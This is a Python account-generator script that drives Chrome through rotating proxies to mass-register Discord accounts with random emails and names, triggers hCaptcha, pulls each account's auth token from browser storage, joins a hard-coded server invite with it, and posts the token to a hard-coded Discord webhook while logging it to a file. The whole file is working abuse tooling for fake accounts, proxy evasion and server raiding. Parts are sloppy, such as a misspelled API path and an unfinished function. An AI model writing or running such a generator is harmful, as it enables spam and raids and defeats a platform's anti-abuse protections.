import undetected_chromedriver as uc
uc.install()
import os
from dhooks.client import Webhook
from discord_webhook import DiscordWebhook
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
import time
from datetime import date, datetime
import json
import math
import base64
import urllib
import hashlib
import random
import string
import requests
import colorama
from colorama import Fore, init
import pyautogui

init()




def random_username():
 with open("MyFile.txt", "r") as file:
  allText = file.read()
  words = list(map(str, allText.split()))




def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def runwindow():
    username = str(input(Fore.BLUE + "Write what name you want » "+ Fore.RESET))
    password = str(input(Fore.GREEN + "Write what password you want » " + Fore.RESET))
    while True:
        proxy = random.choice(open("proxies.txt").readlines())
        print(Fore.GREEN + 'Using proxy ' + proxy + '.')
        driver = webdriver.Chrome(executable_path='chromedriver.exe')
        options = webdriver.ChromeOptions()
        options.add_argument("--incognito")
        options.add_argument("start-maximized")
        options.add_argument('--proxy-server=%s' % proxy)
        driver = webdriver.Chrome(chrome_options=options)
        driver.get("https://discord.com/register")
        time.sleep(1)
        email = get_random_string(8) + str(random.randint(1234, 9876)) + "@gmail.com"
        user = get_random_string(6 ) + str(random.randint(1234, 9876)) + " | Vex"
        driver.find_element_by_xpath('//*[@id="app-mount"]/div[2]/div/div/div/form/div/div/div[1]/div/input').send_keys(
            email)
        time.sleep(0.1)
        driver.find_element_by_xpath('//*[@id="app-mount"]/div[2]/div/div/div/form/div/div/div[2]/div/input').send_keys(get_random_string(3) + str(random.randint(1234, 9876)) +  " | " + username)
        time.sleep(0.1)
        driver.find_element_by_xpath('//*[@id="app-mount"]/div[2]/div/div/div/form/div/div/div[3]/div/input').send_keys(
            password)
        time.sleep(0.1)
        driver.find_element_by_xpath(
            '//*[@id="app-mount"]/div[2]/div/div/div/form/div/div/div[4]/div[1]/div[1]/div/div/div/div/div[1]').click()
        time.sleep(0.3)
        actions = ActionChains(driver)
        time.sleep(.2)
        driver.find_elements_by_class_name('css-1hwfws3')[0].click()
        actions.send_keys(str(random.randint(1, 12)))
        actions.send_keys(Keys.ENTER)
        actions.send_keys(str(random.randint(1, 28)))
        actions.send_keys(Keys.ENTER)
        actions.send_keys(str(random.randint(1990, 2001)))
        actions.send_keys(Keys.ENTER)
        actions.send_keys(Keys.TAB)
        actions.send_keys(Keys.ENTER)
        actions.perform()
        time.sleep(3)
        
        actions.perform()
        driver.find_element_by_class_name('inputDefault-3JxKJ2').click()
        driver.find_element_by_xpath('//*[@id="app-mount"]/div[2]/div/div/div/form/div/div/div[6]/button').click()
        time.sleep(7)
        print(Fore.GREEN + ' ')
        driver.execute_script("hcaptcha.execute();")
        time.sleep(5)
        driver.switch_to.default_content()
        print(Fore.RESET + ' ')
        time.sleep(3)
 
        token = driver.execute_script(
            "let popup; popup = window.open('', '', `width=1,height=1`); if(!popup || !popup.document || !popup.document.write) console.log('Please allow popups'); window.dispatchEvent(new Event('beforeunload')); token = popup.localStorage.token.slice(1, -1); popup.close(); return token")
        api = requests.get("https://discordapp.com/api/v6/invite/TXeqfXxb2B")
        data = api.json()
        check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
        stuff = check.json()
        requests.post("https://discordapp.com/api/v6/invite/TXeqfXxb2B", headers={"Authorization": token})
        requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
        time.sleep(3)
        print(f"Succesfully Joined {api}")
        


        hook = "https://discord.com/api/webhooks/881968056430121001/9HI2CW72p9a0AL8D6ibdwkTXwqm7VxaWZWSOHUcTwX00XErDwTCaD52zW1fvAq32DY9Z"
        r = requests.post(hook, json={
            "content": token
        })
        print(f'Sent webhook post request. Status = {r.status_code} ~ {r.reason}')
        print(f"{token}")
        with open('tokens.txt', 'a') as f:
            f.write(token)
            f.write('\n')
        driver.quit()
        time.sleep(1)



runwindow()